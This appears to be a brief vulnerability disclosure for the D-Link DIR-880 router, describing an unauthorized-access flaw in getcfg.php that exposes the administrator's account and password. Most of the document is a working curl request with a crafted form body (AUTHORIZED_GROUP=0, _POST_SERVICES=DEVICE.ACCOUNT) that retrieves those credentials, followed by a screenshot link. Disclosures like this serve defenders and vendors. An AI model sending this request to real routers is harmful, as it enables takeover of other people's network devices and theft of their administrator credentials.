Manufacturer: D-Link
Product: D-Link DIR-880 series router
Product Model: DIR880A1_FW104WWb01_f4jb

Vulnerability Description
The D-Link DIR-880 has an unauthorized access vulnerability. An attacker can directly obtain critical information such as the backend administrator's account and password through getcfg.php, thereby gaining administrator privileges.

attack
```
curl -X GET "http://192.168.0.1:80/getcfg.php" 
-H "Content-Type: application/x-www-form-urlencoded" 
--data "Z=Z
_POST_SERVICES=DEVICE.ACCOUNT
AUTHORIZED_GROUP=0"
```

<img width="724" height="383" alt="image" src="https://github.com/user-attachments/assets/a389edf5-ad6a-4fdb-ba0d-2375a1620adb" />
